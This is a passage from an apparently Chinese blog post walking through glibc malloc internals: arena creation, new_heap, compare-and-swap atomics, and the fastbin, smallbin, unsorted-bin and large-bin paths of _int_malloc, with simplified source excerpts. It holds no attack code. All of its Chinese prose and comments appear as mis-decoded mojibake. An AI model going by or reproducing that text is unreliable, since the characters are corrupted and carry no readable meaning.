title="_int_new_arena"></a>_int_new_arena</h3><p>è¿™ä¸ªå‡½æ•°å¦‚å‰å›¾æ‰€ç¤ºï¼Œå®ƒæ˜¯ç”¨æ¥åœ¨arenaçš„ä¸ªæ•°è¶…å‡ºé™åˆ¶ä¹‹å‰åˆ›å»ºæ–°çš„arenaçš„ï¼Œå…³é”®ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> mstate _int_new_arena(<span class="type">size_t</span> size) &#123;</span><br><span class="line">  <span class="comment">// ç”¨æŒ‡å®šsizeåˆ›å»ºä¸€ä¸ªæ–°çš„heap_infoå¯¹è±¡</span></span><br><span class="line">  heap_info *h = new_heap(size + (<span class="keyword">sizeof</span>(heap_info) </span><br><span class="line">      + <span class="keyword">sizeof</span>(malloc_state) + MALLOC_ALIGNMENT), mp_.top_pad);</span><br><span class="line">  <span class="keyword">if</span> (!h) &#123;</span><br><span class="line">    <span class="comment">// å¦‚æœsizeè¿‡å¤§å¯¼è‡´new_heapå¤±è´¥ï¼Œåˆ™åˆ›å»ºä¸€ä¸ªåªåŒ…å«</span></span><br><span class="line">    <span class="comment">// åŸºç¡€æ•°æ®ç»“æ„heap_infoå’Œmalloc_stateçš„å¯¹è±¡</span></span><br><span class="line">    h = new_heap (<span class="keyword">sizeof</span> (heap_info) + <span class="keyword">sizeof</span> (malloc_state) </span><br><span class="line">        + MALLOC_ALIGNMENT, mp_.top_pad);</span><br><span class="line">    <span class="keyword">if</span> (!h) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// åˆå§‹åŒ–malloc_state</span></span><br><span class="line">  malloc_state *a = h-&gt;ar_ptr = (malloc_state *) (h + <span class="number">1</span>);</span><br><span class="line">  malloc_init_state (a);</span><br><span class="line">  a-&gt;attached_threads = <span class="number">1</span>;</span><br><span class="line">  a-&gt;system_mem = a-&gt;max_system_mem = h-&gt;size;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// è®¾ç½®malloc_stateä¸­çš„top chunkæŒ‡é’ˆ</span></span><br><span class="line">  <span class="comment">// è®¾ç½®top chunkçš„header</span></span><br><span class="line">  <span class="type">char</span> *ptr = (<span class="type">char</span> *)(a + <span class="number">1</span>);</span><br><span class="line">  top(a) = (mchunkptr)ptr;</span><br><span class="line">  set_head(top(a), (((<span class="type">char</span> *)h + h-&gt;size) - ptr) | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// æ›´æ–°malloc_stateä¸­çš„nexté“¾è¡¨ï¼ŒæŠŠæ–°å»ºçš„arenaåŠ åˆ°é“¾è¡¨ä¸­</span></span><br><span class="line">  thread_arena = a;</span><br><span class="line">  a-&gt;next = main_arena.next;</span><br><span class="line">  main_arena.next = a;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸‹é¢å†ç”¨ä¸€å¼ memory layoutçš„å›¾ç¤ºæ¥å±•ç¤ºåˆšåˆ›å»ºè¿‡çš„arenaé•¿ä»€ä¹ˆæ ·å­ï¼š</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-18_192109.png" alt=""></p><p>å‰é¢çš„_int_new_arenaå‡½æ•°ä¸­è°ƒç”¨äº†new_heapè¿™ä¸ªå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°ä¸»è¦æ˜¯é€šè¿‡mmapå¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨æ¥é€šè¿‡æ“ä½œç³»ç»Ÿåˆ†é…ç©ºé—´ï¼Œç²¾ç®€è¿‡çš„ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">static</span> heap_info *<span class="title function_">new_heap</span><span class="params">(<span class="type">size_t</span> size, <span class="type">size_t</span> top_pad)</span> &#123;</span><br><span class="line">  <span class="comment">// é€šè¿‡ç³»ç»Ÿè°ƒç”¨åˆ†é…å†…å­˜</span></span><br><span class="line">  <span class="type">char</span> *p2 = (<span class="type">char</span> *)MMAP(aligned_heap_area, </span><br><span class="line">      HEAP_MAX_SIZE, PROT_NONE, MAP_NORESERVE);</span><br><span class="line">  <span class="keyword">if</span> (__mprotect(p2, size, </span><br><span class="line">      mtag_mmap_flags | PROT_READ | PROT_WRITE) != <span class="number">0</span>) &#123;</span><br><span class="line">    __munmap (p2, HEAP_MAX_SIZE);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// åˆå§‹åŒ–heap_infoç»“æ„ä½“</span></span><br><span class="line">  heap_info *h = (heap_info *)p2;</span><br><span class="line">  h-&gt;size = size;</span><br><span class="line">  h-&gt;mprotect_size = size;</span><br><span class="line">  <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="int-malloc"><a href="#int-malloc" class="headerlink" title="_int_malloc"></a>_int_malloc</h2><p>è¿˜æ˜¯å…ˆè´´ä¸€ä¸ªæ€»æµç¨‹å›¾:</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-18_161319.png" alt=""></p><h3 id="CASæ“ä½œ"><a href="#CASæ“ä½œ" class="headerlink" title="CASæ“ä½œ"></a>CASæ“ä½œ</h3><p>åœ¨mallocçš„å®ç°ä¸­ï¼Œéœ€è¦é¢‘ç¹çš„æ’å…¥å’Œåˆ é™¤å„ä¸ªbinä¸­çš„chunkï¼Œå¾ˆå¤šåœ°æ–¹ç”¨åˆ°äº†CASæ“ä½œï¼Œå› ä¸ºç”¨çš„æ¯”è¾ƒå¤šï¼Œè¿™é‡Œå…ˆç®€å•ä»‹ç»ä¸€ä¸‹</p><p>CASæ˜¯compare and swapçš„ç¼©å†™ï¼Œå®ƒæ˜¯åŸå­æ“ä½œçš„ä¸€ç§ï¼Œå¯ç”¨äºåœ¨å¤šçº¿ç¨‹ç¼–ç¨‹ä¸­å®ç°ä¸è¢«æ‰“æ–­çš„æ•°æ®äº¤æ¢æ“ä½œï¼Œä»è€Œé¿å…å¤šçº¿ç¨‹åŒæ—¶æ”¹å†™æŸä¸€æ•°æ®æ—¶ç”±äºæ‰§è¡Œé¡ºåºä¸ç¡®å®šæ€§ä»¥åŠä¸­æ–­çš„ä¸å¯é¢„çŸ¥æ€§äº§ç”Ÿçš„æ•°æ®ä¸ä¸€è‡´é—®é¢˜ï¼Œè¯¥æ“ä½œé€šè¿‡å°†å†…å­˜ä¸­çš„å€¼ä¸æŒ‡å®šæ•°æ®è¿›è¡Œæ¯”è¾ƒï¼Œå½“æ•°å€¼ä¸€æ ·æ—¶å°†å†…å­˜ä¸­çš„æ•°æ®æ›¿æ¢ä¸ºæ–°çš„å€¼ã€‚</p><p>CASéœ€è¦æœ‰3ä¸ªæ“ä½œæ•°ï¼šå†…å­˜åœ°å€Vï¼Œæ—§çš„é¢„æœŸå€¼Aï¼Œå³å°†è¦æ›´æ–°çš„ç›®æ ‡å€¼Bï¼ŒCASæŒ‡ä»¤æ‰§è¡Œæ—¶ï¼Œå½“ä¸”ä»…å½“å†…å­˜åœ°å€Vçš„å€¼ä¸é¢„æœŸå€¼Aç›¸ç­‰æ—¶ï¼Œå°†å†…å­˜åœ°å€Vçš„å€¼ä¿®æ”¹ä¸ºBï¼Œå¦åˆ™å°±ä»€ä¹ˆéƒ½ä¸åšï¼Œæ•´ä¸ªæ¯”è¾ƒå¹¶æ›¿æ¢çš„æ“ä½œæ˜¯ä¸€ä¸ªåŸå­æ“ä½œï¼Œä¸‹é¢ä¸¾ä¸€ä¸ªä¾‹å­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> REMOVE_FB(fb, victim, pp)                     \</span></span><br><span class="line"><span class="meta">  do &#123;                                                \</span></span><br><span class="line"><span class="meta">    victim = pp;                                      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (victim == NULL)                               \</span></span><br><span class="line"><span class="meta">      break;                                          \</span></span><br><span class="line"><span class="meta">    pp = REVEAL_PTR(victim-&gt;fd);                      \</span></span><br><span class="line"><span class="meta">  &#125; while ((pp = catomic_compare_and_exchange_val_acq \</span></span><br><span class="line"><span class="meta">      (fb, pp, victim)) != victim);</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢è¿™æ®µä»£ç æ˜¯ç”¨æ¥ä»fast binä¸­åˆ é™¤ä¸€ä¸ªchunkï¼Œæˆ‘ä»¬è¿™é‡Œåªå…³æ³¨<em>catomic_compare_and_exchange_val_acq(fb, pp, victim)</em>è¿™ä¸ªå‡½æ•°è°ƒç”¨ï¼Œå…¶ä¸­fbæ˜¯è¡¨å¤´ï¼Œppæ–°çš„èŠ‚ç‚¹ï¼Œvictimæ˜¯è€çš„èŠ‚ç‚¹ï¼Œéœ€è¦æŠŠè€èŠ‚ç‚¹åˆ æ‰ï¼ŒæŠŠæ–°èŠ‚ç‚¹æ¥ä¸Šï¼Œè¿™ä¸ªè°ƒç”¨å°±æ˜¯é€šè¿‡CASæ“ä½œä¿è¯thread-safeçš„ï¼Œä»¥x86å¹³å°ä¸ºä¾‹ï¼Œä¸€ç›´å¾€ä¸‹è¿½ï¼Œæœ€åº•å±‚çš„å®ç°å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __arch_c_compare_and_exchange_val_32_acq(mem, newval, oldval) \</span></span><br><span class="line"><span class="meta">  (&#123;                                                                  \</span></span><br><span class="line"><span class="meta">    __typeof(*mem) ret;                                               \</span></span><br><span class="line"><span class="meta">    __asm __volatile(<span class="string">&quot;cmpl $0, %%&quot;</span> SEG_REG <span class="string">&quot;:%P5\n\t&quot;</span>                 \</span></span><br><span class="line"><span class="meta">                     <span class="string">&quot;je 0f\n\t&quot;</span>                                      \</span></span><br><span class="line"><span class="meta">                     <span class="string">&quot;lock\n&quot;</span>                                         \</span></span><br><span class="line"><span class="meta">                     <span class="string">&quot;0:\tcmpxchgl %2, %1&quot;</span>                            \</span></span><br><span class="line"><span class="meta">                     : <span class="string">&quot;=a&quot;</span>(ret), <span class="string">&quot;=m&quot;</span>(*mem)                          \</span></span><br><span class="line"><span class="meta">                     : BR_CONSTRAINT(newval), <span class="string">&quot;m&quot;</span>(*mem), <span class="string">&quot;0&quot;</span>(oldval), \</span></span><br><span class="line"><span class="meta">                       <span class="string">&quot;i&quot;</span>(offsetof(tcbhead_t, multiple_threads)));   \</span></span><br><span class="line"><span class="meta">    ret;                                                              \</span></span><br><span class="line"><span class="meta">  &#125;)</span></span><br></pre></td></tr></table></figure><p>è¿™æ˜¯ä¸€æ®µx86çš„å†…è”æ±‡ç¼–ï¼ŒGCCçš„å†…è”æ±‡ç¼–è¯­æ³•å¤§å®¶å¯ä»¥è‡ªè¡ŒæŸ¥é˜…ç›¸å…³èµ„æ–™ï¼Œè¿™é‡Œåªå…³æ³¨lockå’Œcmpxchglè¿™ä¸¤ä¸ªæŒ‡ä»¤ï¼Œlockç¡®ä¿å¯¹å†…å­˜çš„read/writeæ“ä½œåŸå­æ‰§è¡Œï¼Œcmpxchglç”¨æ¥æ¯”è¾ƒå¹¶äº¤æ¢æ“ä½œæ•°ï¼Œæ‰€ä»¥å½’æ ¹ç»“åº•ï¼ŒCASæ“ä½œè¿˜æ˜¯é€šè¿‡ç¡¬ä»¶æŒ‡ä»¤çš„æ”¯æŒæ‰èƒ½å®ç°åŸå­æ“ä½œã€‚</p><h3 id="ä»fastbinåˆ†é…"><a href="#ä»fastbinåˆ†é…" class="headerlink" title="ä»fastbinåˆ†é…"></a>ä»fastbinåˆ†é…</h3><p>åœ¨_int_mallocçš„å¼€å§‹ï¼Œå…ˆçœ‹ç”³è¯·çš„å†…å­˜å¤§å°nbæ˜¯å¦ç¬¦åˆfast binçš„é™åˆ¶ï¼Œç¬¦åˆçš„è¯ï¼Œé¦–å…ˆè¿›å…¥fast binçš„åˆ†é…ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (nb &lt;= get_max_fast()) &#123;</span><br><span class="line">  idx = fastbin_index(nb);</span><br><span class="line">  mfastbinptr *fb = &amp;fastbin(av, idx);</span><br><span class="line">  mchunkptr pp;</span><br><span class="line">  <span class="keyword">if</span> ((victim = *fb) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    REMOVE_FB(fb, pp, victim);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">    alloc_perturb(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¼šæ ¹æ®nbå¾—åˆ°fast binçš„indexï¼Œå†æ ¹æ®indexï¼Œå¾—åˆ°æŒ‡å‘æ‰€åœ¨binçš„headæŒ‡é’ˆfbï¼Œå¦‚æœè¿™ä¸ªbinéç©ºï¼Œåˆ™å–ç¬¬ä¸€ä¸ªchunkï¼Œä½¿ç”¨å‰é¢ä»‹ç»çš„REMOVE_FBå°†å…¶ä»æ‰€åœ¨binåˆ é™¤ï¼Œå¹¶å°†å–åˆ°çš„chunkè¿”å›ã€‚</p><h3 id="ä»smallbinåˆ†é…"><a href="#ä»smallbinåˆ†é…" class="headerlink" title="ä»smallbinåˆ†é…"></a>ä»smallbinåˆ†é…</h3><p>ä¸ç¬¦åˆfast binåˆ†é…æ¡ä»¶çš„è¯ï¼Œä¼šç»§ç»­çœ‹æ˜¯å¦ç¬¦åˆsmall binçš„åˆ†é…æ¡ä»¶ï¼Œè¿™éƒ¨åˆ†çš„ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range(nb)) &#123;</span><br><span class="line">  idx = smallbin_index(nb);</span><br><span class="line">  bin = bin_at(av, idx);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((victim = last(bin)) != bin) &#123;</span><br><span class="line">    bck = victim-&gt;bk;</span><br><span class="line">    set_inuse_bit_at_offset(victim, nb);</span><br><span class="line">    bin-&gt;bk = bck;</span><br><span class="line">    bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">      set_non_main_arena(victim);</span><br><span class="line">    check_malloced_chunk(av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">    alloc_perturb(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„å¤„ç†è¿‡ç¨‹å’Œfast binç±»ä¼¼ï¼Œä¹Ÿæ˜¯æ ¹æ®nbå®šä½åˆ°æ‰€åœ¨çš„binï¼Œæ‰€åœ¨binéç©ºçš„è¯ï¼Œå°±åˆ†é…æˆåŠŸï¼Œè¿”å›å¾—åˆ°çš„chunkï¼Œå¹¶ä¸”ä»æ‰€åœ¨binä¸­åˆ é™¤ï¼Œå’Œfast binçš„æœ€å¤§ä¸åŒä¹‹å¤„åœ¨äºè¿™é‡Œæ“ä½œçš„æ˜¯åŒå‘é“¾è¡¨ã€‚</p><h3 id="merge-fast-bin-into-unsorted-bin"><a href="#merge-fast-bin-into-unsorted-bin" class="headerlink" title="merge fast bin into unsorted bin"></a><strong>merge fast bin into unsorted bin</strong></h3><p>åœ¨fast binå’Œsmall binéƒ½åˆ†é…å¤±è´¥ä¹‹åï¼Œä¼šæŠŠfast binä¸­çš„chunkè¿›è¡Œä¸€æ¬¡æ•´ç†åˆå¹¶ï¼Œç„¶åå°†åˆå¹¶åçš„chunkæ”¾å…¥unsorted binä¸­ï¼Œè¿™æ˜¯é€šè¿‡malloc_consolidateè¿™ä¸ªå‡½æ•°å®Œæˆçš„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">malloc_consolidate</span><span class="params">(mstate av)</span> &#123;</span><br><span class="line">  <span class="comment">// å› ä¸ºè¿™é‡Œä¼šreleaseæ‰€æœ‰çš„fast binï¼Œæ‰€ä»¥å…ˆæŠŠç›¸åº”flag disable</span></span><br><span class="line">  atomic_store_relaxed (&amp;av-&gt;have_fastchunks, <span class="literal">false</span>);</span><br><span class="line">  unsorted_bin = unsorted_chunks(av);</span><br><span class="line">  maxfb = &amp;fastbin(av, NFASTBINS - <span class="number">1</span>);</span><br><span class="line">  fb = &amp;fastbin (av, <span class="number">0</span>);</span><br><span class="line">  <span class="comment">// ä¸¤å±‚å¾ªç¯</span></span><br><span class="line">  <span class="comment">// 1. å¤–å±‚å¾ªç¯éå†æ‰€æœ‰fast bin</span></span><br><span class="line">  <span class="comment">// 2. å†…å±‚å¾ªç¯éå†binä¸­æ‰€æœ‰chunk</span></span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    p = atomic_exchange_acq (fb, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (p != <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="comment">// å†…å±‚å¾ªç¯ä¸»è¦åšäº†ä¸‹é¢å‡ ä»¶äº‹ï¼Œä»£ç å¤ªé•¿ï¼Œç•¥äº†</span></span><br><span class="line">        <span class="comment">// 1. å¦‚æœå½“å‰chunkçš„å‰ä¸€ä¸ªchunkæ˜¯freeçŠ¶æ€ï¼Œè¿›è¡Œåˆå¹¶</span></span><br><span class="line">        <span class="comment">// 2. å¦‚æœå½“å‰chunkçš„åä¸€ä¸ªchunkæ˜¯freeçŠ¶æ€ï¼Œè¿›è¡Œåˆå¹¶</span></span><br><span class="line">        <span class="comment">// 3. å¦‚æœåˆå¹¶åçš„chunkä¸å’Œtop chunkæŒ¨ç€ï¼Œ</span></span><br><span class="line">        <span class="comment">//    å°†åˆå¹¶åçš„chunkæ’å…¥åˆ°unsorted binä¸­</span></span><br><span class="line">        <span class="comment">// 4. å¦‚æœåˆå¹¶åçš„chunkå’Œtop chunkæŒ¨ç€ï¼Œ</span></span><br><span class="line">        <span class="comment">//    é‡æ–°è®¾ç½®top chunkçš„èµ·å§‹ä½ç½®</span></span><br><span class="line">      &#125; <span class="keyword">while</span> ((p = nextp) != <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">while</span> (fb++ != maxfb);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å°è¯•ä»unsorted-binä¸­åˆ†é…"><a href="#å°è¯•ä»unsorted-binä¸­åˆ†é…" class="headerlink" title="å°è¯•ä»unsorted binä¸­åˆ†é…"></a><strong>å°è¯•ä»unsorted binä¸­åˆ†é…</strong></h3><p>è¿™éƒ¨åˆ†ä»£ç å·²ç»è¿›å…¥_int_mallocä¸­æœ€åé‚£ä¸ªæœ€å¤§çš„forå¾ªç¯äº†ï¼Œè¿™éƒ¨åˆ†çš„å·¥ä½œåœ¨forå¾ªç¯çš„åˆšå¼€å§‹ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">  <span class="comment">// forå¾ªç¯çš„ç¬¬ä¸€éƒ¨åˆ†ä»£ç </span></span><br><span class="line">  <span class="type">int</span> iters = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span>((victim = unsorted_chunks(av)-&gt;bk) != unsorted_chunks(av)) &#123;</span><br><span class="line">    bck = victim-&gt;bk;</span><br><span class="line">    size = chunksize(victim);</span><br><span class="line">    mchunkptr next = chunk_at_offset(victim, size);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ç¬¦åˆè¿™å››ä¸ªæ¡ä»¶çš„è¯ï¼Œä»last remainder chunkåˆ†é…</span></span><br><span class="line">    <span class="keyword">if</span> (in_smallbin_range(nb) </span><br><span class="line">        &amp;&amp; bck == unsorted_chunks(av) </span><br><span class="line">        &amp;&amp; victim == av-&gt;last_remainder </span><br><span class="line">        &amp;&amp; size &gt; (nb + MINSIZE)) &#123;</span><br><span class="line">      <span class="comment">// ã€‚ã€‚ã€‚</span></span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ã€‚ã€‚ã€‚</span></span><br><span class="line">    <span class="comment">// æ­£å¥½é‡åˆ°è¯·æ±‚å¤§å°çš„chunkï¼Œåˆ†é…æˆåŠŸ</span></span><br><span class="line">    <span class="keyword">if</span> (size == nb) &#123;</span><br><span class="line">      <span class="comment">// ã€‚ã€‚ã€‚</span></span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// å½“å‰chunkå±äºsmall binçš„èŒƒå›´ï¼Œå°†å…¶æ”¾å›small bin</span></span><br><span class="line">    <span class="keyword">if</span> (in_smallbin_range(size)) &#123;</span><br><span class="line">      <span class="comment">// ã€‚ã€‚ã€‚</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// å½“å‰chunkå±äºlarge binçš„èŒƒå›´ï¼Œå°†å…¶æ”¾å›large bin</span></span><br><span class="line">      <span class="comment">// ã€‚ã€‚ã€‚</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä»unsorted binä¸­åˆ é™¤å½“å‰chunk</span></span><br><span class="line">    <span class="comment">// ã€‚ã€‚ã€‚</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆ¤æ–­æœ€å¤§å¾ªç¯æ¬¡æ•°</span></span><br><span class="line">    <span class="keyword">if</span> (++iters &gt;= <span class="number">10000</span>)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å°è¯•ä»large-binä¸­åˆ†é…"><a href="#å°è¯•ä»large-binä¸­åˆ†é…" class="headerlink" title="å°è¯•ä»large binä¸­åˆ†é…"></a>å°è¯•ä»large binä¸­åˆ†é…</h3><p>è¿™æ˜¯_int_mallocä¸­æœ€åé‚£ä¸ªå¤§forå¾ªç¯çš„ç¬¬äºŒéƒ¨åˆ†ä»£ç ï¼Œåœ¨ä»unsorted binåˆ†é…å¤±è´¥ä¹‹åï¼Œå‡†å¤‡ä»large binåˆ†é…ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">  <span class="comment">// forå¾ªç¯çš„ç¬¬äºŒéƒ¨åˆ†ä»£ç </span></span><br><span class="line">  <span class="comment">// åˆ¤æ–­nbçš„å¤§å°ï¼Œç¬¦åˆæ¡ä»¶çš„è¯ä»large binåˆ†é…</span></span><br><span class="line">  <span class="keyword">if</span> (!in_smallbin_range(nb)) &#123;</span><br><span class="line">    bin = bin_at(av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆ¤æ–­å‰é¢å¾—åˆ°çš„binæ˜¯å¦ä¸ºç©º</span></span><br><span class="line">    <span class="comment">// ä¸ä¸ºç©ºçš„è¯æœ€å¤§çš„chunk sizeæ˜¯å¦å¤§äºç­‰äºè¯·æ±‚å¤§å°nb</span></span><br><span class="line">    victim = first(bin);</span><br><span class="line">    <span class="keyword">if</span> (victim != bin &amp;&amp; chunksize_nomask(victim) &gt;= nb) &#123;</span><br><span class="line">      <span class="comment">// 1. ç”¨best fitç®—æ³•æ‰¾åˆ°æœ€åˆé€‚å¤§å°çš„chunk</span></span><br><span class="line">      <span class="comment">// 2. å¯¹è¿™ä¸ªchunkè¿›è¡Œsplitï¼Œä¸€éƒ¨åˆ†è¿”å›ç»™ç”¨æˆ·ï¼Œ</span></span><br><span class="line">      <span class="comment">// å‰©ä½™éƒ¨åˆ†èµ‹å€¼ç»™malloc_stateä¸­çš„remainderï¼Œ</span></span><br><span class="line">      <span class="comment">// åŒæ—¶æ’å…¥åˆ°unsorted binå½“ä¸­</span></span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// åœ¨è¯·æ±‚å¤§å°nbæ‰€åœ¨çš„binåˆ†é…å¤±è´¥ï¼Œç»§ç»­ä»åé¢çš„binæ¥åˆ†é…ï¼Œ</span></span><br><span class="line">  <span class="comment">// åœ¨æŸ¥æ‰¾åé¢binçš„è¿‡ç¨‹ä¸­ï¼Œä¼šç”¨åˆ°binmapæ¥åŠ å¿«æŸ¥æ‰¾é€Ÿåº¦</span></span><br><span class="line">  ++idx;</span><br><span class="line">  bin = bin_at(av, idx);</span><br><span class="line">  block = idx2block(idx);</span><br><span class="line">  <span class="built_in">map</span> = av-&gt;binmap[block];</span><br><span class="line">  bit = idx2bit(idx);</span><br><span class="line"></span><br><span class="line">  <span 